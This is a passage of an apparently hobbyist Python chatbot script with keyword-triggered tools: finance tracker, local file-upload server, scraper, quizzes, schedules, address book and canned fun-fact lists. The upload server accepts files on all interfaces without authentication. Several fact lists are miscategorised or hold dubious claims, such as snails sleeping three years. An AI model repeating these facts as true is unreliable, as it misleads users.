                                total_expense += abs(total_amount)  # Use `abs` to ensure positivity
                            print(f"{transaction_type} in {category}: ${total_amount:.2f}")

                        # Print summary
                        print(f"\nTotal Income: ${total_income:.2f}")
                        print(f"Total Expenses: ${total_expense:.2f}")
                        print(f"Net Income: ${total_income - total_expense:.2f}")

                    except sqlite3.DatabaseError as e:
                        print(f"Error generating monthly summary: {e}")



            def set_budget(self, category, amount):
                """ Set a budget for a specific category """
                try:
                    self.cursor.execute('''INSERT OR REPLACE INTO budgets (category, amount) VALUES (?, ?)''', (category, amount))
                    self.conn.commit()
                    print(f"Budget for {category} set to ${amount:.2f}")
                except sqlite3.DatabaseError as e:
                    print(f"Error setting budget: {e}")

            def view_budget(self, category):
                """ View the budget for a specific category """
                try:
                    self.cursor.execute('''SELECT amount FROM budgets WHERE category = ?''', (category,))
                    budget = self.cursor.fetchone()
                    if budget:
                        budget_amount = budget[0]
                        total_spent = 0.0
                        self.cursor.execute('''SELECT SUM(amount) FROM transactions WHERE category = ? AND type = 'Expense' ''', (category,))
                        total_spent = self.cursor.fetchone()[0] or 0.0
                        print(f"Budget for {category}: ${budget_amount:.2f}")
                        print(f"Total spent in {category}: ${total_spent:.2f}")
                        if total_spent > budget_amount:
                            print(f"Warning: You have exceeded your budget for {category}!")
                    else:
                        print(f"No budget set for {category}.")
                except sqlite3.DatabaseError as e:
                    print(f"Error viewing budget: {e}")

            def close(self):
                """ Close the database connection """
                try:
                    self.conn.close()
                except sqlite3.DatabaseError as e:
                    print(f"Error closing the database connection: {e}")

        def main():
            tracker = FinanceTracker()
            
            while True:
                try:
                    print("----- FINANCE TRACKER -----")
                    print("1. Add Income")
                    print("2. Add Expense")
                    print("3. View Balance")
                    print("4. View Transactions")
                    print("5. View Monthly Summary")
                    print("6. Set Category Budget")
                    print("7. View Category Budget")
                    print("8. Exit")

                    choice = input("Choose an option (1-8): ")

                    if choice == "1":
                        try:
                            amount = float(input("Enter the income amount: $"))
                            if amount <= 0:
                                print("Amount must be positive!")
                                continue
                        except ValueError:
                            print("Invalid amount entered. Please enter a valid number.")
                            continue
                        
                        category = input("Enter category (e.g., Salary, Bonus): ")
                        if not category:
                            print("Category cannot be empty!")
                            continue
                        description = input("Enter description: ")
                        tracker.add_income(amount, category, description)
                    elif choice == "2":
                        try:
                            amount = float(input("Enter the expense amount: $"))
                            if amount <= 0:
                                print("Amount must be positive!")
                                continue
                        except ValueError:
                            print("Invalid amount entered. Please enter a valid number.")
                            continue
                        
                        category = input("Enter category (e.g., Rent, Groceries): ")
                        if not category:
                            print("Category cannot be empty!")
                            continue
                        description = input("Enter description: ")
                        tracker.add_expense(amount, category, description)
                    elif choice == "3":
                        tracker.view_balance()
                    elif choice == "4":
                        tracker.view_transactions()
                    elif choice == "5":
                        tracker.monthly_summary()
                    elif choice == "6":
                        category = input("Enter category to set a budget for: ")
                        try:
                            amount = float(input(f"Enter budget for {category}: $"))
                            if amount <= 0:
                                print("Amount must be positive!")
                                continue
                            tracker.set_budget(category, amount)
                        except ValueError:
                            print("Invalid budget amount.")
                    elif choice == "7":
                        category = input("Enter category to view budget for: ")
                        tracker.view_budget(category)
                    elif choice == "8":
                        tracker.close()
                        break
                    else:
                        print("Invalid choice! Please select a valid option (1-8).")
                except Exception as e:
                    print(f"An error occured: {e}")

        if __name__ == "__main__":
            main()
        return "Thanks for Using Personal Finance Tracker!"
    elif "-lws" in ui:
        import http.server
        import socketserver
        import os
        import urllib.parse
        import cgi
        from pathlib import Path

        # Function to start the local server with additional features
        def start_server(directory, port=8000):
            # Check if the directory exists
            if not os.path.exists(directory):
                print("Directory not found. Please check the path and try again.")
                return
            
            os.chdir(directory)  # Change the current working directory to the selected directory
            
            handler = CustomHTTPRequestHandler
            with socketserver.TCPServer(("", port), handler) as httpd:
                print(f"Serving files from {directory} on port {port}")
                print(f"Open the following URL in your browser: http://localhost:{port}")
                httpd.serve_forever()

        # Custom request handler to include file uploads and custom behavior
        class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                # Override the GET method to add custom file listing
                if self.path == "/":
                    self.show_file_list()
                else:
                    super().do_GET()

            def do_POST(self):
                # Handle file uploads
                if self.path == "/upload":
                    self.handle_upload()
                else:
                    super().do_POST()

            def show_file_list(self):
                # List the files in the directory
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                
                # Get the list of files
                files = os.listdir()
                html = "<html><body><h2>File List</h2><ul>"
                for file in files:
                    html += f'<li><a href="{urllib.parse.quote(file)}">{file}</a></li>'
                html += "</ul>"
                
                # Add upload form
                html += '''
                <h3>Upload File</h3>
                <form enctype="multipart/form-data" method="post" action="/upload">
                    <input type="file" name="file">
                    <input type="submit" value="Upload">
                </form>
                </body></html>
                '''
                
                self.wfile.write(html.encode("utf-8"))

            def handle_upload(self):
                # Handle file upload via POST request
                form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD': 'POST', 'CONTENT_TYPE': self.headers['Content-Type']})
                file_item = form["file"]

                if file_item.filename:
                    filename = os.path.basename(file_item.filename)
                    filepath = os.path.join(os.getcwd(), filename)
                    with open(filepath, "wb") as f:
                        f.write(file_item.file.read())
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    self.wfile.write(f"<html><body><h3>File uploaded successfully: {filename}</h3><a href='/'>Go back</a></body></html>".encode("utf-8"))
                else:
                    self.send_response(400)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    self.wfile.write("<html><body><h3>No file uploaded.</h3><a href='/'>Go back</a></body></html>".encode("utf-8"))

        # Prompt the user for the folder path
        folder_path = input("Enter the folder path to use as the local server root (e.g., E:/ for Windows or /media/username/pendrive_name for Linux/macOS): ")

        # Start the server on port 8000
        start_server(folder_path)

    elif "-web" in ui:
        import time
        try:
            import requests
            from bs4 import BeautifulSoup

        # Function to get the soup object from a webpage URL
            def get_soup(url):
                response = requests.get(url)
                if response.status_code == 200:
                    return BeautifulSoup(response.text, 'html.parser')
                else:
                    print(f"Failed to retrieve page: {url}")
                    return None

            # Function to scrape a single page's content
            # Scrape a single page's content
            def scrape_page(url):
                soup = get_soup(url)
                if soup:
                    posts = []
                    articles = soup.find_all('div', class_='post')  # Change to match the actual structure
                    
                    for article in articles:
                        title = article.find('h3', class_='post-title').get_text() if article.find('h3', class_='post-title') else 'No title'
                        date = article.find('span', class_='post-date').get_text() if article.find('span', class_='post-date') else 'No date'
                        content = article.find('div', class_='post-content')  # Adjust to actual class
                        content_text = content.get_text() if content else 'No content'
                        
                        posts.append({
                            'Title': title,
                            'Date': date,
                            'Content': content_text.strip()
                        })
                    
                    return posts
                return []

            # Function to handle pagination and scrape multiple pages
            def scrape_website(base_url, num_pages):
                all_posts = []
                
                for page in range(1, num_pages + 1):
                    url = f"{base_url}/page/{page}"  # Adjust URL for pagination (e.g., /page/2, /page/3, etc.)
                    print(f"Scraping {url}...")
                    posts = scrape_page(url)
                    all_posts.extend(posts)
                    time.sleep(2)  # Sleep to avoid overloading the server
                
                return all_posts

            # Function to display the scraped data in the console
            def display_data(posts):
                if posts:
                    for i, post in enumerate(posts, start=1):
                        print(f"\nPost #{i}")
                        print(f"Title: {post['Title']}")
                        print(f"Date: {post['Date']}")
                        print(f"Content: {post['Content']}\n")
                else:
                    print("No posts found.")

            # Main function to execute the scraper
            def main():
                base_url = input("Enter the website URL (e.g., https://example-blog.com): ")
                num_pages = int(input("Enter the number of pages to scrape: "))
                
                # Scrape the website
                all_posts = scrape_website(base_url, num_pages)
                
                # Display the scraped data in the console
                display_data(all_posts)
                return "Done!"

            if __name__ == '__main__':
                main()
        except ImportError:
            return "You need to install 'requests' and 'bs4' library to use this! please use them by using 'pip install <library_name>' or 'pip3 install <library_name>'"

    elif "-brt" in ui:
        import random
        import time
        import os
        print("--- BRAIN TRAIN ---")
        def clear_console():
            os.system('cls' if os.name == 'nt' else 'clear')

        def memory_game():
            print("Welcome to the Memory Game!")
            print("You'll be shown a sequence of numbers to remember.")
            print("Each correct answer increases your level and score.")
            print("-" * 40)
            
            level = 1
            score = 0
            
            while True:
                clear_console()
                print(f"Level {level} - Memorize this sequence!")
                
                # Generate numbers based on level
                numbers = [random.randint(1, 9) for _ in range(5 + level)]
                print(f"Sequence: {' '.join(map(str, numbers))}")
                
                # Wait for a few seconds based on level difficulty
                time.sleep(max(1, 4 - level / 2))
                clear_console()
                
                # User input
                guess = input("Enter the numbers separated by spaces: ").strip()
                try:
                    if list(map(int, guess.split())) == numbers:
                        score += level * 10
                        print("✅ Correct! Well done!")
                        print(f"Your Score: {score}")
                        level += 1
                        time.sleep(2)
                    else:
                        print("❌ Wrong! Better luck next time.")
                        print(f"The correct sequence was: {' '.join(map(str, numbers))}")
                        print(f"Your Final Score: {score}")
                        break
                except ValueError:
                    print("❌ Invalid input. Make sure to enter numbers only!")
                    print(f"The correct sequence was: {' '.join(map(str, numbers))}")
                    print(f"Your Final Score: {score}")
                    break

        # Start the game
        memory_game()
        return "Thanks for playing BrainTrain!"
        
    elif "you are naughty" in ui or "you are naughty!" in ui or "you are a naughty chatbot" in ui or "you are naughty chatbot" in ui:
        return "haha! :) I'm just here to help you!"
    elif "can you make fake profile for me?" in ui or "can you make a profile of me" in ui or "create fake profile" in ui or "create a fake profile" in ui:
        return "run -fpg for fake profile generator!"
    elif "-wipe" in ui:
        import os
        def clear():
            os.system('clear' if os.name == 'posix' else 'cls')
        clear()
        return "Terminal Wiped!"

    elif "-pm" in ui: #poems
        import random
        print("                  POEM")
        poems = [
            "I wandered lonely as a cloud\nThat floats on high o'er vales and hills,\nWhen all at once I saw a crowd,\nA host, of golden daffodils;\nBeside the lake, beneath the trees,\nFluttering and dancing in the breeze.",
            "Two roads diverged in a yellow wood,\nAnd sorry I could not travel both\nAnd be one traveler, long I stood\nAnd looked down one as far as I could\nTo where it bent in the undergrowth;",
            "Shall I compare thee to a summer's day?\nThou art more lovely and more temperate:\nRough winds do shake the darling buds of May,\nAnd summer's lease hath all too short a date:",
            "How do I love thee? Let me count the ways.\nI love thee to the depth and breadth and height\nMy soul can reach, when feeling out of sight\nFor the ends of being and ideal grace.",
            "The woods are lovely, dark and deep,\nBut I have promises to keep,\nAnd miles to go before I sleep,\nAnd miles to go before I sleep."
        ]
        print("---------------------------------------------")
        print(random.choice(poems))
        print("---------------------------------------------")
        return "Your Poem is ready!"

    elif "-mq" in ui:
        import random

        # Function to ask questions based on difficulty
        def ask_question(difficulty):
            if difficulty == "easy":
                num1 = random.randint(1, 10)
                num2 = random.randint(1, 10)
                operator = random.choice(["+", "-"])
            elif difficulty == "medium":
                num1 = random.randint(10, 50)
                num2 = random.randint(10, 50)
                operator = random.choice(["+", "-", "*"])
            elif difficulty == "hard":
                num1 = random.randint(50, 100)
                num2 = random.randint(50, 100)
                operator = random.choice(["+", "-", "*", "/"])

            question = f"{num1} {operator} {num2} = ?"
            
            # Calculate the answer
            if operator == "+":
                answer = num1 + num2
            elif operator == "-":
                answer = num1 - num2
            elif operator == "*":
                answer = num1 * num2
            elif operator == "/":
                answer = round(num1 / num2, 2)  # Round to 2 decimal places for division

            return question, answer

        # Function to start the quiz
        def start_quiz():
            print("----- MATHS QUIZ! -----")
            # print("------------------------")
            print("Choose your difficulty:")
            print("1. Easy")
            print("2. Medium")
            print("3. Hard")

            choice = input("Enter your choice (1/2/3): ")
            print("------------------------")
            if choice == "1":
                difficulty = "easy"
            elif choice == "2":
                difficulty = "medium"
            elif choice == "3":
                difficulty = "hard"
            else:
                print("Invalid choice, defaulting to Easy.")
                difficulty = "easy"

            score = 0
            total_questions = 5

            # Ask 8 questions
            for i in range(total_questions):
                question, correct_answer = ask_question(difficulty)
                print(f"\nQuestion {i+1}: {question}")
                
                user_answer = input("Your answer: ")

                try:
                    if float(user_answer) == correct_answer:
                        print("Correct!")
                        score += 1
                    else:
                        print(f"Incorrect! The correct answer was {correct_answer}")
                except ValueError:
                    print("Invalid input! Please enter a number.")
                                # Show final score
            print(f"\nYour score: {score}/{total_questions}")

        if __name__ == "__main__":
            start_quiz()
            print("--------------------------------------")
            return("Quiz over! Thanks for playing.")
    elif "tell me a fun fact about space." in ui or "space fun fact" in ui or "a fun fact about face" in ui or "space fact" in ui or "funfact space" in ui:
        import random
        FfactS = [ 
                  "The Sun is so large that it could fit 1.3 million Earths inside it!",
                  "Venus takes about 243 Earth days to rotate once but only 225 Earth days to orbit the Sun.",
                  "The Moon is moving approximately 3.8 cm away from our planet every year.",
                  "The International Space Station orbits Earth every 90 minutes.",
                  "The largest volcano in the solar system is on Mars. It is called Olympus Mons and is nearly 14 miles high, which is about three times higher than Mount Everest.",
                  "Scientists created the coldest spot in space aboard the International Space Station.",
                  "The first living being to go into space was a dog named Laika from Russia.",
                  ]
        return random.choice(FfactS)
    elif "-cln" in ui: #calendar
            print("--------------------")
            import calendar
            import datetime
            y = datetime.datetime.now().year
            m = datetime.datetime.now().month
            x = calendar.month(y, m)
            print(x)
            print("--------------------")
            return "Calendar Opened!"
    elif "how can I stay motivated?" in ui or "how can i stay motivated" in ui or "how can i stay motivated?" in ui or "how to stay motivated" in ui:
        return "1. Set small goals\n2. Reward yourself\n3. Surround yourself with positive people\n4. Keep a positive attitude\n5. Visualize your success\n6. Take breaks\n7. Stay organized\n8. Listen to music\n9. Exercise\n10. Remember your 'why'"
    elif "suggest apps for time management or study" in ui or "suggest apps for time management" in ui or "suggest apps for study" in ui or "suggest apps for study or time management" in ui or "best app for time management" in ui or "best app for study" in ui:
        return "1. Todoist\n2. Trello\n3. Forest\n4. Focus@Will\n5. Habitica\n6. Freedom\n7. Evernote\n8. Google Calendar\n9. Notion\n10. Anki"
    elif "suggest alternatives of famous softwares" in ui or "alternatives to software" in ui:
        return "1. Google Docs - Microsoft Word, LibreOffice Writer, Zoho Writer\n2. Adobe Photoshop - GIMP, Krita, Paint.NET\n3. Microsoft Excel - Google Sheets, LibreOffice Calc, Zoho Sheet\n4. Spotify - Apple Music, YouTube Music, Amazon Music\n5. Zoom - Microsoft Teams, Google Meet, Skype\n6. WhatsApp - Signal, Telegram, Viber\n7. Instagram - Snapchat, TikTok, VSCO\n8. Facebook - Twitter, LinkedIn, Reddit\n9. Google Chrome - Mozilla Firefox, Microsoft Edge, Safari\n10. Netflix - Hulu, Amazon Prime Video, Disney+"
    elif "suggest apps for mental health" in ui or "suggest apps for mental health or meditation" in ui or "suggest apps for meditation" in ui or "suggest apps for mental health or meditation" in ui or "best app for mental health" in ui or "best app for meditation" in ui or "tell me best app for mental health" in ui or "tell me best app for meditation" in ui:
        return "1. Headspace\n2. Calm\n3. Insight Timer\n4. Aura\n5. Smiling Mind\n6. Breethe\n7. Simple Habit\n8. Ten Percent Happier\n9. MyLife Meditation\n10. Buddhify"
    elif "dog vs cat" in ui or "dog or cat" in ui or "dog vs cat?" in ui or "cat or dog?" in ui or "cat vs dog" in ui:
        return "Dogs are known for their loyalty and companionship, while cats are known for their independence and low maintenance. It ultimately depends on your lifestyle and preferences."
    elif "tell me a fun fact about animals." in ui or "animal fun fact" in ui or "a fun fact about animals" in ui or "animal fact" in ui or "funfact animal" in ui or "animals fun facts" in ui or "animals funfact" in ui or "animal funfacts" in ui:
        import random
        Animal_facts = [
                  "A group of flamingos is called a 'flamboyance.'",
                  "A rhinoceros' horn is made of compacted hair.",
                  "A snail can sleep for three years.",
                  "Cows have best friends and can become stressed when they are separated.",
                  "Penguins propose to their lifemates with a pebble.",
                  "A group of porcupines is called a 'prickle.'",
                  "A group of ferrets is called a 'business.'",
                  "A group of hedgehogs is called a 'prickle.'",
                  "A group of owls is called a 'parliament.'",
                 ]
        return random.choice(Animal_facts)
    elif "which place everyone should visit" in ui or "best place everyone should visit" in ui or "famous places to visit" in ui or "best place to visit" in ui or "best places to visit?" in ui:
            import random
            places = [
                    "Japan, Tokyo",
                    "India, Agra",
                    "France, Paris",
                    "Singapore",
                    "UAE, Dubai",
                    "Thailand, Bangkok",
                    "Costa Rica",
                    "India, Mumbai",
                    "Australia, Sydney",
                    "India, Ladakh",
            ]
            return f"You should visit {random.choice(places)}"
    elif "what's trending on social media" in ui or "trending on social media" in ui or "what is trending on social media?" in ui or "trending on social media?" in ui:
        return "The trending topics on social media change frequently. You can check the trending section on platforms like Twitter (X), Instagram, and Facebook to see the latest updates."
    elif "tell me a fun fact about food." in ui or "food fun fact" in ui or "a fun fact about food" in ui or "food fact" in ui or "funfact food" in ui:
        import random
        FfactFd = [
                  "Honey never spoils; archaeologists have found 3000-year-old honey that's still edible.",
                  "Bananas are berries, but strawberries aren't.",
                  "Sharks existed before trees; they've been around for over 400 million years.",
                  "A day on Venus is longer than a year on Venus.",
                  "Wombat poop is cube-shaped.",
                  "There are more stars in the universe than grains of sand on Earth.",
                  "A narwhal's tusk is actually a tooth.",
                  "Avocados are poisonous to birds.",
                  "Humans share about 60% of their DNA with bananas."
                 ]
        return random.choice(FfactFd)
    elif "how many steps should I walk daily?" in ui or "how many steps should i walk daily" in ui or "how many steps should a person walk daily?" in ui or "how many steps should a person walk daily" in ui:
        return "The general recommendation is to aim for 10,000 steps per day, which is roughly equivalent to 5 miles. However, the ideal number of steps can vary based on individual fitness goals and health conditions."
    elif "what are some healthy snacks?" in ui or "healthy snacks" in ui or "healthy snacks?" in ui or "tell me some healthy snacks" in ui or "what snacks are best for health" in ui or "what snacks are best for health?" in ui:
        return "1. Mixed nuts\n2. Greek yogurt with berries\n3. Apple slices with almond butter\n4. Carrot sticks with hummus\n5. Rice cakes with avocado\n6. Cottage cheese with pineapple\n7. Edamame\n8. Dark chocolate with almonds\n9. Air-popped popcorn\n10. Veggie sticks with guacamole"
    elif "help me create a daily schedule" in ui or "create my schedule" in ui or "please help me create a daily schedule" in ui or "create a daily schedule" in ui or "create my daily schedule" in ui or "-sch" in ui:
        daily_schedules = {
                        "Early Riser": {
                            "6:00 AM": "Wake up, drink water, and stretch",
                            "6:30 AM": "Exercise or yoga",
                            "7:00 AM": "Take a shower and get ready",
                            "7:30 AM": "Have breakfast",
                            "8:00 AM - 12:00 PM": "Focus on work or study",
                            "12:00 PM - 1:00 PM": "Lunch and short walk",
                            "1:00 PM - 4:00 PM": "Continue work or study",
                            "4:00 PM - 5:00 PM": "Break or light exercise",
                            "5:00 PM - 7:00 PM": "Leisure or hobby time",
                            "7:00 PM - 8:00 PM": "Dinner with family",
                            "8:00 PM - 9:30 PM": "Relax, read, or light TV",
                            "10:00 PM": "Go to bed",
                        },
                        "Night Owl": {
                            "8:00 AM": "Wake up, drink water, and stretch",
                            "8:30 AM": "Have breakfast",
                            "9:00 AM - 1:00 PM": "Work or study session",
                            "1:00 PM - 2:00 PM": "Lunch and short break",
                            "2:00 PM - 6:00 PM": "Focus on creative tasks or projects",
                            "6:00 PM - 7:00 PM": "Light exercise or walk",
                            "7:00 PM - 8:00 PM": "Dinner",
                            "8:00 PM - 10:00 PM": "Leisure or socializing",
                            "10:00 PM - 12:00 AM": "Night work or study session",
                            "12:30 AM": "Relax, read, or meditate",
                            "1:00 AM": "Go to bed",
                        },
                        "Student Routine": {
                            "7:00 AM": "Wake up, freshen up, and stretch",
                            "7:30 AM": "Have breakfast",
                            "8:00 AM - 1:00 PM": "Classes or study time",
                            "1:00 PM - 2:00 PM": "Lunch and short rest",
                            "2:00 PM - 4:00 PM": "Homework or revision",
                            "4:00 PM - 5:00 PM": "Break or hobby time",
                            "5:00 PM - 7:00 PM": "Group study or projects",
                            "7:00 PM - 8:00 PM": "Dinner",
                            "8:00 PM - 9:30 PM": "Revising and preparing for the next day",
                            "10:00 PM": "Sleep",
                        },
                        "Work-from-Home": {
                            "7:00 AM": "Wake up, freshen up, and stretch",
                            "7:30 AM": "Have breakfast",
                            "8:00 AM - 12:00 PM": "Focus on work tasks",
                            "12:00 PM - 1:00 PM": "Lunch and short break",
                            "1:00 PM - 5:00 PM": "Continue work, with small breaks",
                            "5:00 PM - 6:00 PM": "Light exercise or walk",
                            "6:00 PM - 7:00 PM": "Wrap up work or plan for tomorrow",
                            "7:00 PM - 8:00 PM": "Dinner",
                            "8:00 PM - 9:30 PM": "Relaxation or hobbies",
                            "10:00 PM": "Go to bed",
                        },
                        "Fitness Enthusiast": {
                            "6:00 AM": "Wake up and hydrate",
                            "6:30 AM": "Workout or run",
                            "7:30 AM": "Healthy breakfast",
                            "8:00 AM - 12:00 PM": "Work or study",
                            "12:00 PM - 1:00 PM": "Lunch with high-protein meals",
                            "1:00 PM - 4:00 PM": "Continue work or study",
                            "4:00 PM - 5:00 PM": "Light snack and stretch",
                            "5:00 PM - 7:00 PM": "Sports or gym session",
                            "7:00 PM - 8:00 PM": "Dinner with a balanced diet",
                            "8:00 PM - 9:30 PM": "Relax, meditate, or watch TV",
                            "10:00 PM": "Sleep",
                        }
                    }
        sche = input("---- SCHEDULE MAKER ---- \n1.Early Riser\n2.Night Owl\n3.Student Routine\n4.Work-from-home\n5.Fitess Enthusiast \nChoose(1/2/3/4/5): ")
        if sche == "1":
            # print(daily_schedules["Early Riser"])
            def print_schedule(name):
                    if name in daily_schedules:
                        print(f"Schedule for {name}:\n")
                        for time, activity in daily_schedules[name].items():
                            print(f"{time}: {activity}")
                    else:
                        print(f"No schedule found for {name}.")
            print_schedule("Early Riser")
        elif sche == "2":
                def print_schedule(name):
                        if name in daily_schedules:
                            print(f"Schedule for {name}:\n")
                            for time, activity in daily_schedules[name].items():
                                print(f"{time}: {activity}")
                        else:
                            print(f"No schedule found for {name}.")
                print_schedule("Night Owl")
            # print(daily_schedules["Night Owl"])
        elif sche == "3":
            def print_schedule(name):
                    if name in daily_schedules:
                        print(f"Schedule for {name}:\n")
                        for time, activity in daily_schedules[name].items():
                            print(f"{time}: {activity}")
                    else:
                        print(f"No schedule found for {name}.")
            print_schedule("Student Routine")
            #print(daily_schedules["Student Routine"])
        elif sche == "4":
            def print_schedule(name):
                    if name in daily_schedules:
                        print(f"Schedule for {name}:\n")
                        for time, activity in daily_schedules[name].items():
                            print(f"{time}: {activity}")
                    else:
                        print(f"No schedule found for {name}.")
            print_schedule("Work-from-Home")
            #print(daily_schedules["Work-from-Home"])
        elif sche == "5":
            def print_schedule(name):
                    if name in daily_schedules:
                        print(f"Schedule for {name}:\n")
                        for time, activity in daily_schedules[name].items():
                            print(f"{time}: {activity}")
                    else:
                        print(f"No schedule found for {name}.")
            print_schedule("Fitness Enthusiast")
            #print(daily_schedules["Fitness Enthusiast"])
        else:
            print("Invalid choice. Please select a valid option.")
        return "Your Daily Schedule is Ready!"
    elif "-adb" in ui:
            import sys
            import sqlite3
            print("--- ADDRESS BOOK ---")
            format = input("1. Txt Format Address Book\n2. Sqlite3 Format Address Book (Recommend)\n3. Exit\nChoose (1/2): ")

            if "1" in format:
                print("------------------------")
                print("Txt Format address book")
                name = input("Enter Name: ")
                number = input("Enter Phone (with country code, e.g., +91): ")
                if not number.startswith("+") or not number[1:].isdigit():
                    print("Invalid phone number! Ensure it starts with '+' followed by digits.")
                    sys.exit()
                address = input("Enter Address (Optional): ")
                email = input("Enter Email (Optional): ")
                filelocation = input("Enter location to store the text file (e.g., path/of/the/folder/addr.txt): ")
                try:
                    with open(filelocation, "w") as data:
                        data.write(f"Address Book-\nName: {name}\nNumber: {number}\nAddress: {address}\nEmail: {email}")
                        print(f"Data saved to {filelocation}")
                except Exception as e:
                    print(f"Error saving file: {e}")
                seedata = input("Do you want to see the address book text? (y/n): ").lower()
                if seedata == "y":
                    try:
                        with open(filelocation, "r") as f:
                            print(f.read())
                    except Exception as e:
                        print(f"Error reading file: {e}")
                else:
                    print("Program finished!")

            elif "2" in format:
                print("--------------------------")
                print("Sqlite3 Format address book")
                try:
                    # Connect to SQLite database (or create it if it doesn't exist)
                    conn = sqlite3.connect("address_book.db")
                    cursor = conn.cursor()

                    # Create a table for the address book
                    cursor.execute('''
                    CREATE TABLE IF NOT EXISTS contacts (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        name TEXT NOT NULL,
                        phone TEXT NOT NULL,
                        email TEXT,
                        address TEXT
                    )
                    ''')
                except sqlite3.Error as e:
                    print(f"Database connection error: {e}")
                    sys.exit()

                # Function to add a new contact
                def add_contact(name, phone, email=None, address=None):
                    try:
                        cursor.execute('''
                        INSERT INTO contacts (name, phone, email, address)
                        VALUES (?, ?, ?, ?)
                        ''', (name, phone, email, address))
                        conn.commit()
                        print("Contact added successfully!")
                    except sqlite3.Error as e:
                        print(f"Error adding contact: {e}")

                # Function to view all contacts
                def view_contacts():
                    try:
                        cursor.execute("SELECT * FROM contacts")
                        rows = cursor.fetchall()
                        for row in rows:
                            print(f"ID: {row[0]}, Name: {row[1]}, Phone: {row[2]}, Email: {row[3]}, Address: {row[4]}")
                    except sqlite3.Error as e:
                        print(f"Error retrieving contacts: {e}")

                # Function to update a contact
                def update_contact(contact_id, name=None, phone=None, email=None, address=None):
                    try:
                        query = "UPDATE contacts SET "
                        fields = []
                        values = []

                        if name:
                            fields.append("name = ?")
                            values.append(name)
                        if phone:
                            fields.append("phone = ?")
                            values.append(phone)
                        if email:
                            fields.append("email = ?")
                            values.append(email)
                        if address:
                            fields.append("address = ?")
                            values.append(address)

                        query += ", ".join(fields) + " WHERE id = ?"
                        values.append(contact_id)

                        cursor.execute(query, values)
                        conn.commit()
                        print("Contact updated successfully!")
                    except sqlite3.Error as e:
                        print(f"Error updating contact: {e}")

                def delete_contact(contact_id):
                    try:
                        cursor.execute("DELETE FROM contacts WHERE id = ?", (contact_id,))
                        conn.commit()
                        print("Contact deleted successfully!")
                    except sqlite3.Error as e:
                        print(f"Error deleting contact: {e}")

                # Main menu
                def main():
                    while True:
                        print("\nAddress Book Menu:")
                        print("1. Add Contact")
                        print("2. View Contacts")
                        print("3. Update Contact")
                        print("4. Delete Contact")
                        print("5. Exit")

                        choice = input("Enter your choice(1/2/3/4/5): ").strip()

                        if choice == "1":
                            name = input("Enter name: ")
                            phone = input("Enter Phone (with country code, e.g., +91): ")
                            if not phone.startswith("+") or not phone[1:].isdigit():
                                print("Invalid phone number! Ensure it starts with '+' followed by digits.")
                                continue

                            email = input("Enter email (optional): ")
                            address = input("Enter address (optional): ")
                            add_contact(name, phone, email, address)
                        elif choice == "2":
                            view_contacts()
                        elif choice == "3":
                            try:
                                contact_id = int(input("Enter contact ID to update: "))
                                name = input("Enter new name (leave blank to keep unchanged): ") or None
                                phone = input("Enter new phone (leave blank to keep unchanged): ") or None
                                email = input("Enter new email (leave blank to keep unchanged): ") or None
                                address = input("Enter new address (leave blank to keep unchanged): ") or None
                                update_contact(contact_id, name, phone, email, address)
                            except ValueError:
                                print("Invalid ID format.")
                        elif choice == "4":
                            try:
                                contact_id = int(input("Enter contact ID to delete: "))
                                delete_contact(contact_id)
                            except ValueError:
                                print("Invalid ID format.")
                        elif choice == "5":
                            print("Exiting Address Book!")
                            break
                        else:
                            print("Invalid choice. Please try again.")

                if __name__ == "__main__":
                    main()
                conn.close()
            elif "3" in format:
                    print("Exiting Address Book!")
            else:
                print("Invalid choice! Please restart the program.")
            return "Work Done!"
    elif "tell me some dark web facts" in ui or "dark web facts" in ui or "dark web fact" in ui or "some dark web facts" in ui or "tell me dark web fact" in ui or "tell me dark web facts" in ui or "-dwf" in ui:
        import random
        common_facts = [
                "Hidden Websites: The dark web consists of websites that are not indexed by standard search engines like Google."
                "Access via Tor: The most common way to access the dark web is through the Tor browser, which anonymizes users by routing traffic through multiple servers.",
                "Anonymity: The dark web offers anonymity to users, which can be used for both legal and illegal activities.",
                "Illegal Activities: The dark web is notorious for hosting illegal marketplaces, including those for drugs, firearms, and hacking services.",
                "Darknet Markets: Popular darknet marketplaces, like Silk Road (now closed), facilitated transactions involving illegal goods and services.",
                "Cryptocurrency: Transactions on the dark web are often carried out using cryptocurrencies like Bitcoin and Monero to keep users' identities anonymous.",
                "Privacy and Security: Many use the dark web for privacy reasons, such as journalists, activists, and whistleblowers, who need to protect their identity.",
                "Governments' Interest: Governments and law enforcement agencies closely monitor dark web activity in an attempt to combat criminal activity.",
                "Data Leaks and Hacking: The dark web is home to stolen data, including passwords, credit card information, and private databases.",
                "Forums and Communities: There are many forums on the dark web, where people discuss a wide range of topics from tech to illegal activities.",
                "Privacy Tools: Various privacy tools and guides are available on the dark web to protect users' identities and data.",
                "Cybercrime Hub: The dark web hosts hackers for hire, who provide services like launching DDoS attacks and developing malware.",
                "Illegal Streaming: The dark web is also a hub for illegal streaming services that broadcast copyrighted content without permission.",
                "Trafficking: The dark web is often associated with illegal human trafficking, although law enforcement has been working to shut down these networks.",
                "Anonymity vs. Legality: Not everything on the dark web is illegal; many users simply seek privacy or use it for political activism in oppressive regimes.",
        ]
        unheard_facts = [
                "Educational Resources: The dark web also offers educational resources, such as guides on privacy protection, cryptography, and computer security.",
                "Phishing Kits: Some parts of the dark web sell phishing kits, which are used by cybercriminals to steal personal information from unsuspecting victims.",
                "Child Protection: Ironically, the dark web has been used to spread resources for protecting children from exploitation, with non-profit organizations also monitoring these spaces.",
                "Medical Drugs: The dark web is a market for prescription drugs and medical supplies that aren't easily available through legal channels.",
                "Doxxing Services: Some dark web users offer doxxing services, where they gather and share personal information of individuals online.",
                "Decentralized Hosting: Some websites on the dark web are hosted on decentralized platforms, making them harder to shut down.",
                "Political Activism: In authoritarian regimes, activists use the dark web to communicate and organize without fear of government surveillance.",
                "Fake Documents: The dark web is known for offering counterfeit documents like fake passports, birth certificates, and social security numbers.",
                "Black Market for Weapons: There are dark web markets where firearms and even military-grade weapons are traded illegally.",
                "Software Exploits: Hackers often sell software exploits on the dark web, which can be used to attack or infiltrate systems and networks.",
